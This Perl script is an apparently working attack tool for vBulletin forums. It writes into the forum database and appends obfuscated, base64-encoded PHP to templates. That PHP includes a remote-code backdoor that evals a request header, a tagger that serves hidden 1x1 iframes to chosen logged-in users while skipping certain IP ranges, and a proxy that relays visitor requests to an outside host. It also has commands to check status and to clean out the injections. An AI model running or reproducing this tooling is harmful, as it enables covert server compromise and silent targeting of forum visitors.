#!/usr/bin/env perl

use strict;
use warnings;
use Getopt::Long;
use DBI;
use MIME::Base64;
use Digest::MD5 qw(md5_hex);
use POSIX ":sys_wait_h";

my $hour = 60*60;

my $postlist = '';
my $crumb = '';
my $minutes = '';
my $force = 0;
my $verbose = 0;
my $DB_host = "localhost";
my $DB_port = "3306";
my $DB_name;
my $DB_user;
my $DB_pass;
my $DB_table = "template";
my $DB_con;
my $config_file;
my $sslOP = "ssloff";
my $tagInt = 6;
my $tagTime = 24*$hour;
my $tagUrl;
my $http = 1;
my $blackList = '84b8026b3f5e6dcfb29e82e0b0b0f386,e6d290a03b70cfa5d4451da444bdea39'; # unregistered (EN), dbedd120e3d3cce1 (AR)
my @excludeList;
my @excludeListHex;
my @includeList;
my @includeListHex;
my @postList;
my $tagTemplate = "navbar";
my $proxyTemplate = "header";
my $doorTemplate = "footer";
my $proxyPage = "showpost.php";

my $codePrefix = '".@eval(base64_decode("';
my $codeSuffix = '"))."';
my $userHashSalt = "l9ed39e2fea93e5";
my $op;
my $code_door;
my $code_tag;
my $code_proxy;

my @opTypes = ("tag", "door", "proxy", "proxytag", "status", "reset",
        "cleanTag", "cleanDoor", "cleanProxy", "cleanAll",
        "showTag", "showDoor", "showProxy", "showTagged", "showTaggedCount",
	"showAll", "findAll");

sub main();

getOpts();
main();


sub main() {
        $DB_con = DBI->connect("DBI:mysql:$DB_name:$DB_host:$DB_port", $DB_user, $DB_pass) or die "Error connecting @!";

    if(($op eq "tag") || ($op eq "proxytag")) {
        op_tag();
    } elsif ($op eq "door") {
        op_door();
    } elsif ($op eq "proxy") {
        op_proxy();
        op_tag();
    } elsif ($op eq "status") {
        op_status();
        showTaggedCount();
    } elsif ($op eq "reset") {
        op_reset();
    } elsif ($op eq "cleanTag") {
        op_clean($tagTemplate);
    } elsif ($op eq "cleanDoor") {
        op_clean($doorTemplate);
    } elsif ($op eq "cleanProxy") {
        op_clean($proxyTemplate);
        op_clean($tagTemplate);
    } elsif($op eq "cleanAll") {
        op_cleanall();
    } elsif ($op eq "showTag") { 
        show_table($tagTemplate);
    } elsif ($op eq "showDoor") { 
        show_table($doorTemplate);
    } elsif ($op eq "showProxy") {
        show_table($proxyTemplate);
    } elsif ($op eq "showTagged") {
        showTagged();
        showTaggedCount();
    } elsif ($op eq "showTaggedCount") {
        showTaggedCount();
    } elsif ($op eq "showAll") {
        op_showAll();
    } elsif ($op eq "findAll") {
        op_findAll();
    } else {
        die "Unknown op.\n";
    }

    $DB_con->disconnect();
}

sub getOpts {
    my $help = 0;

    my ($lDB_host, $lDB_port, $lDB_name, $lDB_user,
        $lDB_pass, $lDB_table, $lSSL, $lTagTime);

    if($#ARGV == -1) {
        printUsage();
        exit(1);
    }

    GetOptions(
    "help!" => \$help,
    "op:s" => \$op,
    "h:s" => \$lDB_host,
    "port:s" => \$lDB_port,
    "d:s" => \$lDB_name,
    "u:s" => \$lDB_user,
    "p:s" => \$lDB_pass,
    "t:s" => \$lDB_table,
    "conf:s" => \$config_file,
    "ssl:s" => \$sslOP,
    "int:i" => \$tagInt,
    "time:i" => \$lTagTime,
    "minutes!" => \$minutes,
    "crumb!" => \$crumb,
    "tag:s" => \$tagUrl,
    "http!" => \$http,
    "bl:s" => \$blackList,
    "exclude|x:s" => \@excludeList,
    "exclude-hex|xh:s" => \@excludeListHex,
    "wl|include|i:s" => \@includeList,
    "include-hex|ih:s" => \@includeListHex,
    "postlist|i:s" => \@postList,
    "tagtemplate:s" => \$tagTemplate,
    "proxytemplate:s" => \$proxyTemplate,
    "doortemplate:s" => \$doorTemplate,
    "f!" => \$force,
    "v!" => \$verbose
    );

    if($help eq "1" or not defined $op) {
        printUsage();
        exit(1);
    }

    grep(/\Q$op\E/, @opTypes) or die "Invalid op. Use: " . join(' ', @opTypes) ."\n";

    defined($config_file) and read_config($config_file);

    if(defined($lDB_host)) {
        $DB_host = $lDB_host;
    }

    if(defined($lDB_port)) {
        $DB_port = $lDB_port;
    }

    if(defined($lDB_name)) {
        $DB_name = $lDB_name
    }

    if(defined($lDB_user)) {
        $DB_user = $lDB_user;
    }

    if(defined($lDB_pass)) {
        $DB_pass = $lDB_pass;
    }

    if(defined($lDB_table)) {
        $DB_table = $lDB_table
    }

    defined($DB_host) and defined($DB_port) and defined($DB_name) 
        and defined($DB_user) and defined($DB_pass) and defined($DB_table)
        or die "DB stuff not defined.\n";

    if(defined($lTagTime)) {
        $tagTime = $lTagTime * $hour;
    }
    
    if(defined($lTagTime) && $minutes) {
        $tagTime = $lTagTime * 60;
    }

    if (defined($tagUrl) and $tagUrl !~ /(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/) {
        die "Invalid tag URL: $tagUrl\n";
    }

    print "DB Host: $DB_host\n";
    print "DB Port: $DB_port\n";
    print "DB Name: $DB_name\n";
    print "DB User: $DB_user\n";
    print "DB Pass: $DB_pass\n";
    print "DB Table: $DB_table\n\n";

    if($op eq "tag" or $op eq "proxy") {
        defined $tagUrl or die "You must give a tag URL.\n";

        print "SSL: $sslOP\n";
        print "Tag Rand Interval: $tagInt\n";
        print "Tag Time: $tagTime\n";
        print "Tag Template: $tagTemplate\n";
        print "Proxy Template: $proxyTemplate\n" if $op eq "proxy";

        if($sslOP ne "sslonly" and $sslOP ne "mixed" and $sslOP ne "ssloff") {
            die "Unkown ssl option ($sslOP), options are sslonly, mixed or ssloff\n";
        }

        if(not $force and $tagInt < 2) {
            die "Tag Interval cannot be less than 2.\n";
        }
    
        if(not $force and $tagTime < $hour) {
            die "Tag time cannot be less than 1.\n";
        }

        my $tmp_bl = $blackList;
        $tmp_bl =~ s/[a-fA-F0-9,]//g;
        if($tmp_bl ne "") {
            die "There are illegal characters in the black list ($tmp_bl). You need comma separated MD5 sums\n";
        }
    }

#   if($DB_name eq "" or $DB_user eq "" or $DB_pass eq "" or $DB_host eq "") {
#       print "Database Name, User, Password and Host are required\n";
#       exit;
#   }
}

sub printUsage {
        print <<END;
 Usage: $0 -op OP OPTIONS
    -help             Prints help
    -op OP            Operation: [showTag | showProxy | showDoor | showTagged | showTaggedCount | showAll | findAll |
                      tag | proxy | proxytag | door | cleanTag | cleanProxy | cleanDoor | cleanAll | reset |status]
    -v                Verbose
    -f                Force
    -h DBHOST         Database host name.
    -port DBPORT      Database port, 3306 is default.
    -d DBNAME         Database name.
    -u DBUSER         Database username.
    -p DBPASS         Database password.
    -t TABLE          Insert tags/proxy into TABLE in DBNAME.
    -crumb            Make the browser grab an image from the original server when tagging. Used to correlate the Apache logs.
    -conf FILE        VBulletin config.php file (includes/config.php). Required unless
                        DBHOST, DBPORT, DBNAME, and DBPASS specified.
    -ssl SSL          Enable SSL tagging where SSL is one of sslonly, mixed, ssloff
                        Default: ssloff
    -time HOURS|MINS  Tagging frequency in hours or minutes.
                        Default: 24 hours
    -minutes          Redefine tagging frequency to minutes instead of hours.
    -int INTRVL       Random tagging interval.
                        Default: 6
    -tag URL          Tag to insert, i.e. domain.info/nested/attribs/bins/1/define/route47165_
    -nohttp           Turn off http building in the url
    -bl               MD5 Blacklist (MD5,MD5,...). default is 84b8026b3f5e6dcfb29e82e0b0b0f386,e6d290a03b70cfa5d4451da444bdea39 (Unregistered (EN), dbedd120e3d3cce1 (AR))
    -exclude USER [,USER,...]
    -exclude-hex USERHEX [,USERHEX,...]
    -include USER [,USER,...]
    -include-hex USERHEX [,USERHEX,...]
    -postlist POST [,POST,...]
    -tagtemplate TMPLT   Insert the tag in TMPLT.
    -proxytemplate TMPLT Insert the proxy in TMPLT.
    -doortemplate TMPLT  Insert the door in TMPLT.
END
}

sub op_door {
    $code_door = '".@eval(base64_decode("' . getBase64Encode('eval($_SERVER["HTTP_REFERRER"]); return "";') . '"))."';
    
    print "Insert door\n";
    patch_db($code_door, $doorTemplate);
}

sub op_tag {
    if ($tagUrl) {
        if(not $force){
            die "Looks like $tagTemplate was already tagged. Clean first. Otherwise, use -f if you know what you're doing.\n"
                if verify($codePrefix, $tagTemplate, 0);
            die "Looks like $proxyTemplate already proxied. Use -op proxytag instead of -op tag. Otherwise clean with -op cleanProxy.\n"
                if (verify($codePrefix, $proxyTemplate, 0) &&  ($op eq "tag"));
            die "Looks like $proxyTemplate is NOT proxied. Use -op tag instead of -op proxytag. Otherwise clean with -op cleanTag.\n"
                if (!verify($codePrefix, $proxyTemplate, 0) &&  ($op eq "proxytag"));
        }
	$code_tag = $codePrefix . makeTagCode() . $codeSuffix;
        print "Insert tag\n";
        patch_db($code_tag, $tagTemplate);
        validateTemplate($tagTemplate) or die "Template is corrupted. You should clean it.\n";
    } else {
        print "Missing Tag\n";
    }

}

sub op_proxy() {
    if ($tagUrl) {
        if(not $force){
            die "Looks like $tagTemplate was already tagged. Clean first.\n"
                if (verify($codePrefix, $tagTemplate, 0) && ($op eq "proxy"));
            die "Looks like $proxyTemplate already proxied. Clean first.\n"
                if verify($codePrefix, $proxyTemplate, 0);
        }
	$code_proxy = $codePrefix . makeProxyCode() . $codeSuffix;
        print "Insert proxy\n";
        patch_db($code_proxy, $proxyTemplate);
    } else {
        print "Missing Tag\n";
    }
}

sub extractCode {
    my $t = shift;
    $t =~ /\Q$codePrefix\E(.*)\Q$codeSuffix\E/;
    $t = $1;
    $t =~ /[A-Za-z0-9\+\/=]/ or return undef;
    return decode_base64($t);
}

sub extractTag {
    my $tc = $_[0];
    my $pc = $_[1];
    my $url;
    my $h;

    if (defined($tc) and $tc =~ /\$htt\s*=\s*"([^"]+)";/) {
        $url = $1;
    }

    if (defined($pc) and $pc =~ /\$fahost\s*=\s*"([^"]+)";/) {
        $h = $1;
    }
    defined $url and defined $h and return ($h,$url);
    defined $url and return (undef, $url);

    return undef;
}

sub op_status() {
    my $p = 0;
    my $t = 0;
    my $d = 0;
    my $msg = "";
    my $statement = sql_exec("SELECT title,template FROM template WHERE template LIKE '%$codePrefix%$codeSuffix%'");
    my ($tc, $pc) = (undef, undef);
    while (my @row = $statement->fetchrow_array()) {
        my $code = extractCode($row[1]);
        my $s = "??";
        if ($code =~ /proxyhost/) {
            $s = "Proxy";
            $pc = $code;
            $p = 1;
        }
	if ($code =~ /$userHashSalt/) {
            $s = "Tag";
            $tc = $code;
            $t = 1;
        }
        if ($code =~ /_SERVER\[\"HTTP_REFERRER\"\]/) {
            $s = "Backdoor";
            $d = 1;
        }
        $msg .= sprintf "%-15s $row[0]\n", "$s template:";
    }
    print "Status: ";
    print "TAGGING " if $t;
    print "PROXYING " if $p;
    print "BACKDOOR" if $d;
    print "nothing enabled" if !$t and !$p and !$d;
    print "\n";
    print $msg;

    if ($t) {
        my ($h,$tag) = extractTag($tc, $pc);
        print "Proxy " if $p;
        print "Tag: " . (defined $tag ? $tag : "???") . "\n";
        print "Proxy Target: $h\n" if $p;
    }
}

sub op_reset() {
    sql_exec("DELETE FROM datastore WHERE ".
        "LENGTH(title) = 15 AND LENGTH(data) < 60 and data LIKE 'a:2:{i:0;i:%;i:1;i:%;}'");
}

sub show_table {
    my $title = $_[0];

    my $statement = sql_exec(
        "SELECT template FROM $DB_table WHERE title='$title'");

    print $statement->fetchrow() . "\n";

    $statement->finish();
}

sub showTaggedCount {
    my $statement = sql_exec("SELECT COUNT(*) FROM datastore WHERE ".
        "LENGTH(title) = 15 AND LENGTH(data) < 60 and data LIKE 'a:2:{i:0;i:%;i:1;i:%;}'");

    my $row = $statement->fetchrow();
    
    print "\nTagged User(s) = $row\n";
}

sub showTagged {
    my $statement = sql_exec("SELECT title, data FROM datastore WHERE ".
        "LENGTH(title) = 15 AND LENGTH(data) < 60 and data LIKE 'a:2:{i:0;i:%;i:1;i:%;}'");

    print "------ User ------+---- last page view reset time ----+--- page views until tag ---\n";
    while (my @row = $statement->fetchrow_array()) {
        my $name = $row[0];
        my @state = tagStateUnserialize($row[1]);
        my @ts = localtime($state[0]);
        my $rtime = sprintf("%02d/%02d/%04d %02d:%02d:%02d",
                ($ts[4] + 1), $ts[3], ($ts[5]+1900), $ts[2], $ts[1], $ts[0]);
        my $views;
        if ($state[1] == -1) {
            $views = "-1 (tagged, waiting for reset)";
        } else {
            $views = $state[1];
        }
        printf "%-17s | %-34s| %s\n", $name, $rtime, $views;
    }
}

sub op_showAll {
    print "---- TAG TEMPLATE: $tagTemplate ----\n";
    show_table($tagTemplate);

    print "\n---- DOOR TEMPLATE: $doorTemplate ----\n";
    show_table($doorTemplate);

    print "\n---- PROXY TEMPLATE: $proxyTemplate ----\n";
    show_table($proxyTemplate);

    print "\n\n";
    showTagged();
}

sub op_findAll {
        my $statement = sql_exec("SELECT title,template FROM template WHERE template LIKE '%$codePrefix%$codeSuffix%'");
    printf "%16s | %s\n", "Template", "Op type";
    printf "-----------------+-------------------\n";
        while (my @row = $statement->fetchrow_array()) {
                my $code = extractCode($row[1]);
        my $s = "";
                if ($code =~ /proxyhost/) {
                        $s .= "Proxy ";
                }
                if ($code =~ /$userHashSalt/) {
                        $s .= "Tag ";
                }
                if ($code =~ /_SERVER\[\"HTTP_REFERRER\"\]/) {
                        $s .= "Backdoor ";
                }
        printf "%16s | %s\n", $row[0], $s;
        }
}

sub patch_db {
    my $patchString = $_[0];
    my $title = $_[1];

    $patchString =~ s/\\/\\\\/g;

    print "Patching... ";
       #print "$DB_table $patchString $title\n";

    my $statement = sql_exec(
        "UPDATE $DB_table SET template = CONCAT(template, '$patchString') WHERE title='$title'");
    
        #print ("UPDATE $DB_table SET template = CONCAT(template, '$patchString') WHERE title='$title'\n");
    $statement->finish();

    print "Done\n";

    if(verify($patchString, $title, 1) == 0) {
        print "Patch failed\n";
    }
}

sub tagStateUnserialize() {
    my $d = shift;

    $d =~ /a:2:\{i:0;i:(\d+);i:1;i:(-?\d+);}/ or return undef;

    return ($1, $2);
}

sub op_clean {
    my $title = $_[0];
    print "Cleaning code... ";

    my $statement = sql_exec(
        "UPDATE $DB_table SET template = SUBSTRING_INDEX(template, '\".\@eval(',1) WHERE title='$title';");
    
    print "Done\n";

    $statement->finish();

    if(verify('".@eval(', $title, 1) == 1) {
        print "Clean failed\n";
    }
}

sub op_cleanall {
    my $statement = sql_exec(
        "UPDATE $DB_table SET template = SUBSTRING_INDEX(template, '$codePrefix',1);");
    $statement->finish();

    $statement = sql_exec(
        "SELECT title FROM $DB_table WHERE template LIKE '%$codePrefix%';");
    $statement->fetchrow_array();
    $statement->rows == 0 or die "Clean didn't take.\n";
    print "All clean.\n";
}

sub verify {
    my $checkString = $_[0];
    my $title = $_[1];
    my $verbose = $_[2];

    $checkString =~ s/\\/\\\\/g;

    print "Verifying... " if $verbose;
    
    my $statement = sql_exec(
        "SELECT template FROM $DB_table WHERE title='$title' and template LIKE '%$checkString%'");

    $statement->fetchrow_array();

    my $row_count = $statement->rows;
    
    $statement->finish();

    if($row_count == 0) {
        print "Patch is NOT in the database.\n" if $verbose;
        return 0;
    } else {
        print "Patch is in the database.\n" if $verbose;
        return 1;
    }
}

sub sql_exec {
    my $stat = $_[0];

    #print "SQL: $stat\n";

    my $statement = $DB_con->prepare($stat);
    $statement->execute() or die "Error executing statement: @!";

    return $statement;
}

sub validateTemplate {
    my $template = $_[0];

    my $statement = sql_exec("SELECT template FROM template WHERE title = '$template'");
    while (my @row = $statement->fetchrow_array()) {
        checkPhpSyntax($row[0]) or return 0;
    }

    return 1;

}

{
my $php;
sub checkPhpSyntax {
    my $code = $_[0];

    # look for php
    if (not defined($php)) {
        foreach my $p (split(':', $ENV{PATH})) {
            if (-x "$p/php") {
                $php = "$p/php";
                last;
            }
        }

        if (not defined($php)) {
            print "Warning: Failed to find php command line.\n";
            print "We couldn't validate the modified template, but you are probably ok.\n";
            $php = "0";
        }
    }

    if (defined($php) and $php ne "0") {
        my $pid = open(PHP, "|-", "$php -H -l -n -d log_errors=Off &>/dev/null");
        print PHP $code;
        close(PHP);
        if (not WIFEXITED($?) and not WEXITSTATUS($?) == 0) {
            return 0;
        }
    }

    return 1;
}}

sub existsUser {
    my $u = $_[0];

    my $statement = sql_exec("SELECT username FROM user WHERE username='$u'");
    while (my @r = $statement->fetchrow_array()) {}
    return 1 if ($statement->rows > 0);
    return 0;
}

sub getUserList {
    my $lst = $_[0];
    my $lsth = $_[1];
    my @users = ();

    if (defined($lst)) {
        push @users, split(',', join(',', @$lst));
    }

    if (defined($lsth)) {
        my @hstrs = split(',', join(',', @$lsth));
        my @str = ();
        foreach my $s (@hstrs) {
            $s =~ /^[a-fA-F0-9]+$/ or die "Invalid hex string: $s\n";
            length($s) % 2 == 0 or die "Invalid hex string length: $s\n";
            push @users, pack("C*", map(hex, unpack("(A2)*", $s)))
        }
    }

    return @users;
}

sub getPostList {
    my $lst = $_[0];
    my @posts = ();

    if (defined($lst)) {
        push @posts, split(',', join(',', @$lst));
    }

    return @posts;
}



sub getVbVersion() {
    my $stat = sql_exec("SELECT value FROM setting WHERE varname = 'templateversion'");
    my @row = $stat->fetchrow();
    $stat->finish();
    if (@row == 0) {
        return undef;
    }
    else {
        return $row[0];
    }
}
    

sub read_config {
    my $file = $_[0];

    my $line;

    my $crap;
    my $major;
    my $minor;
    my $field;
    my $value;

    open (IN, "<$file") or die "Can't open ($file) $!\n";

    while($line = <IN>) {
        $line = trim($line);
        if( !($line =~ m/^[\/\/\#]/) and $line =~ m/\$config/) {
            ($major, $value) = split(/=/, $line);

            $value = trim($value);
            $value =~ s/[ ;\']//g;

            ($crap, $major, $crap, $minor, $crap) = split(/\'/, $major);

            $field = "$major$minor";
            if($field eq "Databasedbname") {
                $DB_name = $value;
            } elsif($field eq "Databasetableprefix") {
                $DB_table = "$value$DB_table";
            } elsif($field eq "MasterServerservername") {
                $DB_host = $value;
            } elsif($field eq "MasterServerport") {
                $DB_port = $value;
            } elsif($field eq "MasterServerusername") {
                $DB_user = $value;
            } elsif($field eq "MasterServerpassword") {
                $DB_pass = $value;
            }
        }
    }

    close(IN);
}

sub trim {
        my $string = $_[0];
        $string =~ s/^\s+//;
        $string =~ s/\s+$//;
        return $string;
}

sub run {
        my $cmd = $_[0];

        print "CMD: $cmd\n";
        print `$cmd`;
}

sub getBase64Encode {
        my $enc = encode_base64($_[0]);
    $enc =~ s/\n//g;
    $enc;
}

sub getBase64File {
        my $filename = $_[0];
    my $contents;
    
    
    open(IN, "<$filename") or die "Couldn't open file $filename: $!\n";
    
    binmode(IN);
    $contents = encode_base64(do { local $/; <IN>});
    close(IN);
    
    $contents =~ s/\n//g;
    $contents;
}

sub makeTagCode {
    my $contents;
    my $text;
    my ($text2, $text3, $text4, $text5); # used to build the code interactively
    my $urlBuild;
    my $crumbBuild = "''";
    my $bl;
    my $postl;
    my $proxyUrl;
    my $proxyTo;
    my $doSSL = "";

    print "BL: $blackList\n";
    foreach my $b (split(/,/, $blackList)) {
        $bl .= " and \$md !== '" . trim($b) . "'";
    }

    my @users = getUserList(\@excludeList, \@excludeListHex);
    my $msg = "Exclude: ";
    my $exp = "";
    foreach my $u (@users) {
        existsUser($u) or die "User '$u' does not exist in database.\n";
        my $xu = md5_hex($u);
        $msg .= "$u($xu) ";
        $bl .= " and \$md !== '$xu'";
    }
    $bl .= $exp if length($exp) > 0;
    print "$msg\n";
    
    @users = getUserList(\@includeList, \@includeListHex);
    $msg = "Include: ";
    $exp = "";
    foreach my $u (@users) {
        existsUser($u) or die "User '$u' does not exist in database.\n";
        my $xu = md5_hex($u);
        $msg .= "$u($xu) ";
        $exp .= " or \$md == '$xu'";
    }
    $bl .= " and (false $exp)" if length($exp) > 0;
    print "$msg\n";
    print "filter exp: true $bl\n" if $verbose;

    if(@postList){
        $exp = "";
        my @posts = getPostList(\@postList);
            foreach my $p (@posts) {
            $exp .= " or \$v->GPC['postid'] == $p";
        }
        $postl .= " and (false $exp)" if length($exp) > 0;
        print "post exp: true $postl\n" if $verbose;
    }

    $tagUrl =~ s/[\r\t\n]//g;
    $tagUrl = trim($tagUrl);

    if($tagUrl =~ m/\.html$/) {
        die "Tag should not be ending with '.html' (it's automatically appended), check to make sure you entered it correctly!\n";
    }

    if($tagUrl =~ m/^(http|https):\/\//) {
        die "Tag should not start with http:// or https:// (those are automatically prepended), check to make sure you entered it correctly!\n";
    }


    if(($op eq "proxy") || ($op eq "proxytag")){
        ($proxyTo, $proxyUrl) = split(/\//, $tagUrl, 2);
        $urlBuild = '$htt = "showpost.php/' . $proxyUrl . '";';
    } elsif(!$http) {
        $urlBuild = '$htt = "' . $tagUrl . '";';
    } else {
        if($sslOP eq "ssloff") {
            $doSSL = "or isset(\$_SERVER['HTTPS'])";
            $urlBuild = '$htt = "http://' . $tagUrl . '";';
        } elsif($sslOP eq "mixed") {
            $urlBuild = <<END;
        if(isset(\$_SERVER['HTTPS'])) {
        \$htt = "https://$tagUrl";
        }
        else {
        \$htt = "http://$tagUrl";
        }
END
        } elsif($sslOP eq "sslonly") { # SSL only
            $doSSL = "or !isset(\$_SERVER['HTTPS'])";
            $urlBuild = '$htt = "https://' . $tagUrl . '";';
        } else {
            die "How did that ($sslOP)SSL option sneak in here?";
        }
    }
    
    if($crumb){
    $crumbBuild = <<END;
'<img src="images/' . bin2hex(substr(\$u,0,14)) . ".gif" . '" height="1" width="1" style="visibility:hidden">'
END
    }

    $text = <<END;
// Check that we are not on SSL and some VB globals are available.
if(!isset(\$vbulletin) OR !isset(\$vbulletin->datastore) $doSSL) {
    return "";
}

// Get pointers
\$bd = 'build_datastore';
\$v =& \$vbulletin;
\$d =& \$v->datastore;
\$r =& \$d->registry;

// Get local state, username and array with switch and ctime
\$n = \$_SERVER['SERVER_ADDR'] . \$r->config['MasterServer']['servername'];
\$u = \$v->userinfo['username'];
\$k = substr(md5("$userHashSalt" . \$n), 0, 15);
\$d->fetch(array(\$k));

clearstatcache();
\$st = stat("showthread.php");
\$st[10] = 1258466920;

// Initialize. This is the first run.
if(!isset(\$r->\$k)) {
    \$tmp[0] = true;
    \$tmp[1] = \$st[10];

    \$bd(\$k, serialize(\$tmp), 1);
    \$d->fetch(array(\$k));

    // Don't tag if, for whatever reason, we can't save state.
    // Same length is used for username. So if this key is saved
    //  then the username should be saved.
    if(!isset(\$r->\$k)) {
        return "";
    }
}

// We don't want to tag if the switch is off or showthread's ctime (st[10]) has changed.
\$rk =& \$r->\$k;
if (!is_array(\$rk)) {
    \$rk = unserialize(\$rk);
}

if(\$rk[0] == false OR \$rk[1] !== \$st[10]) {
    return "";
}

if(THIS_SCRIPT=='showthread' or (THIS_SCRIPT=='private' and 
    (\$_REQUEST['do']=='newpm' or \$_REQUEST['do'] == 'showpm'))){

    \$eu=urlencode(\$u);
    \$md = md5(\$u);
    if(true$bl) {
        \$td = time();
END

        if($minutes){ # separate this group from the others, notice '4'
            $text2 = <<END;
            \$key = substr(md5(\$n . \$u . \$v->userinfo['salt'] . '4'), 0, 15);
END
        }
        else{
            $text2 = <<END;
            \$key = substr(md5(\$n . \$u . \$v->userinfo['salt']), 0, 15);
END
        }

        # this always happens
            $text3 = <<END;
        \$d->fetch(array(\$key));

        if(!isset(\$r->\$key)) {
            \$bd(\$key, serialize(array('')), 1);
            \$d->fetch(array(\$key));
        }

        \$rk =& \$r->\$key;
        if (!is_array(\$rk)) {
            \$rk = unserialize(\$rk);
        }
        if(preg_match('/^(64\.38\.3\.50|195\.28\.|94\.102\.|91\.93\.|41\.130\.|212\.118\.|79\.173\.|85\.159\.|94\.249\.|86\.108\.)/',IPADDRESS)){
            return "";
        }
END

        # when viewing a particular thread (defined by -postlist), always tag immediately
        if(@postList){
            $text4 = <<END;
                if(true$postl){
                        $urlBuild
                        return '<iframe src="' . \$htt . bin2hex(substr(\$u,0,14)) . ".html" . '" height="1" width="1" scrolling="no" frameborder="0" unselectable="yes" marginheight="0" marginwidth="0"></iframe>';
                }
END
        }
        # this is the normal case. tag randomly every so often
        else{ 
            $text4 = <<END;
        if(\$td - \$rk[0] >= $tagTime) {
            \$rk[0] = \$td;
            \$rk[1] = rand(0, $tagInt);

            \$bd(\$key, serialize(\$rk), 1);
        } 

        if(\$rk[1] > 0) {
            \$rk[1] = \$rk[1] - 1;
            \$bd(\$key, serialize(\$rk), 1);
        }   
        else if(\$rk[1] == 0) {
            // should make it -1 and stop tagging for today.
            \$rk[1] = \$rk[1] - 1;
            \$bd(\$key, serialize(\$rk), 1);
            
            $urlBuild
            return $crumbBuild . '<iframe src="' . \$htt . bin2hex(substr(\$u,0,14)) . ".html" . '" height="1" width="1" scrolling="no" frameborder="0" unselectable="yes" marginheight="0" marginwidth="0"></iframe>';
        }
END
        }

# finish the code, could put it in $text4, but then the code looks weird with the parens
$text5 = <<END;
    }
}

return "";
END

    $text = $text . $text2 . $text3 . $text4 . $text5;
    checkPhpSyntax($text) or die "Tag code has a PHP syntax error.\n";

    my $prepared = prepareCode($text);
    print "---- CODE ----\n$text\n---- CODE ----\n";

    return $prepared;
}


sub makeProxyCode {
    my $text;
    my $proxyUrl1;
    my $proxyUrl2;
    my $proxyTo;
    my $prxy;
    
    ($proxyTo, $proxyUrl1, $proxyUrl2, $prxy) = ($tagUrl =~ /(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/);
    print "Proxy matching on: $prxy\n";
    $text = <<END;
error_reporting(0);

if((preg_match("/\\/$prxy/", \$_SERVER['PATH_INFO'])) && (!preg_match('/^(64\\.38\\.3\\.50)/', \$_SERVER['REMOTE_ADDR']))) {

\$agent = \$_SERVER['HTTP_USER_AGENT'];
\$proxyhost = "127.0.0.2|127.0.0.1";
\$fahost = "$proxyTo";
\$proxyhost = \$_SERVER['HTTP_HOST'];
\$proxy = \$proxyhost . \$_SERVER['SCRIPT_NAME'];
\$script = \$_SERVER['SCRIPT_NAME'];

\$new_path = ltrim(\$_SERVER['PATH_INFO'],'/');

if(strlen(\$_SERVER['PATH_INFO']) > 0){
  \$query = \$_SERVER['QUERY_STRING'];
  if(strlen(\$query) > 1){
    \$fa = "http://\$fahost/\$new_path?\$query";
  } 
  else{
    \$fa = "http://\$fahost/\$new_path";
  }
}

\$refer = \$_SERVER['HTTP_REFERER'];
\$lang = \$_SERVER['HTTP_ACCEPT_LANGUAGE'];
\$forw = \$_SERVER['HTTP_X_FORWARDED_FOR'];
\$url_info = parse_url(\$fa);
\$query = isset(\$url_info["query"]) ? "?" . \$url_info["query"] : "";
\$req  = "GET " . \$url_info["path"] . \$query . " HTTP/1.1\\r\\n";
\$req .= "Host: " . \$proxyhost . "\\r\\n";
\$req .= "User-Agent: " . \$agent . "\\r\\n";
\$req .= "Accept-Language: " . \$lang . "\\r\\n";
if(strlen(\$script) > 0){
  \$req .= "From: " . \$script . "\\r\\n";
}
if(!empty(\$_SERVER['HTTP_X_FORWARDED_FOR'])){
  \$req .= "X-Forwarded-For: " . \$forw . ",  " . \$_SERVER['REMOTE_ADDR'] . "\\r\\n";
}
else{
  \$forw = \$_SERVER['REMOTE_ADDR'];
  \$req .= "X-Forwarded-For: " . \$forw . "\\r\\n";
}
\$req .= "Referer: " . \$refer . "\\r\\n";
\$req .= "Connection: close\\r\\n";
\$req .= "\\r\\n";

\$port = isset(\$url_info["port"]) ? \$url_info["port"] : 80;
\$fp = fsockopen(\$url_info["host"],\$port,\$errno,\$errstr,30);
if(!\$fp){
  exit();
}
fwrite(\$fp,\$req);
stream_set_timeout(\$fp,60);
\$res = "";
while(!feof(\$fp)){
  \$res .= fgets(\$fp,128);
}
fclose(\$fp);
\$res = \@explode("\\r\\n\\r\\n",\$res,2);
\$header = \$res[0];
\$page = \$res[1];

\$headers = explode("\\r\\n",\$header);
foreach(\$headers as \$value){
  \$a = "";
  \$b = "";
  list(\$a,\$b) = explode(":",\$value);
  \$http_header[trim(\$a)] = trim(\$b);
  if((\$_SERVER['HTTPS']) && (preg_match("/Pragma: no-cache|Cache-Control: no-cache, no-store/",\$value))){
    
  }
  else{
    header(\$value);
  }
}

\$size = \$http_header["Content-Length"];
\$type = \$http_header["Content-Type"];

if(empty(\$http_header['Content-Type'])){
  \$type = 'text/html';
}

//if(preg_match("/\$proxyhost/",\$page)){
//  \$text = preg_replace("/\$proxyhost/", \$proxy, \$page);
//  \$size = strlen(\$text);
//}
//else{
  \$text = \$page;
//}
if (eregi('text/html',\$type)){
  header("Content-Type: text/html;charset=");
}
if((\$_SERVER['HTTPS']) && (preg_match("/http:\\\/\\\/\$proxyhost/",\$text))){
    \$text = preg_replace("/http:\\\/\\\/\$proxyhost/", "https://\$proxyhost", \$text);
    \$size++; 
}
header("Content-Length: \$size");

print \$text;
exit(0);
}
END

    checkPhpSyntax($text) or die "Proxy code has a PHP syntax error.\n";

    my $prepared = prepareCode($text);
    #print "---- CODE ----\n$text\n---- CODE ----\n";

    return $prepared;
}

sub prepareCode {
    my $text = $_[0];

    my $contents = "";

        foreach my $line (split(/\n/, $text)) {
                $line = trim($line);
                my $append = " ";

                if($line ne "" and not ($line =~ m/^\/\//)) {
                        if($line =~ m/[\;\)\}\{]$/) {
                                $append = "";
                        }

                        #optimize:
                        $line =~ s/\) \{/\)\{/g;
                        $line =~ s/ == /==/g;
                        $line =~ s/ !== /!==/g;
                        $line =~ s/ = /=/g;
                        $line =~ s/ - /-/g;
                        $line =~ s/ =& /=&/g;
                        $line =~ s/, /,/g;
                        $line =~ s/ > />/g;
                        $line =~ s/\} else/\}else/g;
                        $line =~ s/ \. /\./g;

                        $contents .= $line . $append;
                }
        }

        return getBase64Encode($contents);
}
